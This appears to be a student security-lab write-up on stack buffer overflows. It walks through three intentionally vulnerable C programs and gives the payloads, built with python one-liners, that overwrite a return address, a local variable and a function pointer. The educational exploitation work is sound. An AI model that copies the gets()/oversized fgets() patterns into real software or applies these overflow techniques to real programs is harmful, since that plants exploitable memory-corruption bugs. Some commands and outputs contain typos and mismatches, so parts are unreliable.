﻿# Attacks
___
Firstly, run the docker image
```bash
docker run -it --privileged -v $HOME/Seclabs:/home/seed/seclabs img4lab
```
## Bof1.c 
***
```c
#include<stdio.h>
#include<unistd.h>
void secretFunc()
{
    printf("Congratulation!\n:");
}
int vuln(){
    char array[200];
    printf("Enter text:");
    gets(array);
    return 0;
}
int main(int argc, char*argv[]){
    if (argv[1]==0){
        printf("Missing arguments\n");
    }
    vuln();
    return 0;
}
```
Firstly, we need to compile the code.
```shell script --compile
$ gcc -g bof1.c -o bof1,out -fno-stack-protector -mpreferred-stack-boundary=2
```
Then, we open the binary in gdb.
```shell script --gdb
$ gdb -q ./bof1.out
```
In order to run the secretFunc, we need to overwrite the return address of the vuln function with the address of the secretFunc.
And to do that we need to find the address of the secretFunc.
```shell script --gdb-peda
gdb-peda$ p secretFunc
```
output:
```shell script --gdb-peda --output
$1 = {void ()} 0x804846b <secretFunc>
```
We know the stack frame of the vuln function
![stack-frame](https://github.com/user-attachments/assets/f958d795-a5c0-4699-8f7a-29dbe3fe507e)

We know the array is 200 bytes long, and ebp is 4 bytes long, so we need to overwrite 204 bytes to reach the return address.
```shell script
$ echo $(python -c 'print "A"*204 + "\x6b\x84\x04\x08"') | ./bof1.out XXXX
```
output:
```shell script --output
Enter text:Congratulation!
Segmentation fault
```
## Bof2.c
***
```c
#include <stdlib.h>
#include <stdio.h>

void main(int argc, char *argv[])
{
  int var;
  int check = 0x04030201;
  char buf[40];

  fgets(buf,45,stdin);

  printf("\n[buf]: %s\n", buf);
  printf("[check] 0x%x\n", check);

  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");

  if (check == 0xdeadbeef)
   {
     printf("Yeah! You win!\n");
   }
}
```
Firstly, we need to compile the code.
```shell script --compile
$ gcc -g bof2.c -o bof2.out -fno-stack-protector -mpreferred-stack-boundary=2
```
We know the stack frame of the main function
![stack-frame]()
We know the array is 40 bytes long, so we need to overwrite 40 bytes to reach the check variable.
```shell script
$ echo $(python -c 'print "A"*40 + "\x01\x02\x03\x04"') | ./bof2.out
Let's try to get to the first if statement
```
output:
```shell script --output

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
[check] 0xddadbeef

You are on the right way!
```
Now, let's try to reach the second if statement.
```shell script
$ echo $(python -c 'print "A"*40 + "\xef\xbe\xad\xde"') | ./bof2.out
```
output:
```shell script --output

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
[check] 0xdeadbeef
Yeah! You win!
```
## Bof3.c
***
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void shell() {
    printf("You made it! The shell() function is executed\n");
}

void sup() {
    printf("Congrat!\n");
}

void main()
{ 
    int var;
    void (*func)()=sup;
    char buf[128];
    fgets(buf,133,stdin);
    func();
}
```
Firstly, we need to compile the code.
```shell script --compile
$ gcc -g bof3.c -o bof3.out -fno-stack-protector -mpreferred-stack-boundary=2
```
Then, we open the binary in gdb.
```shell script --gdb
$ gdb -q ./bof3.out
```
In order to run the shell function, we need to overwrite the func pointer with the address of the shell function.
And to do that we need to find the address of the shell or func function.
```shell script --gdb-peda
gdb-peda$ p shell
```
output:
```shell script --gdb-peda --output
$1 = {void ()} 0x804845b <shell>
```
We know the stack frame of the main function
![stack-frame]()
We know the array is 128 bytes long and void pointer points to func which is 4 bytes long.
So we only need to overwrite 128 bytes to reach the func pointer and then overwrite it with the address of the shell function.
```shell script
$ echo $(python -c 'print "A"*128 + "\x5b\x84\x04\x08"') | ./bof3.out
```
output:
```shell script --output
You made it! The shell() function is executed
```



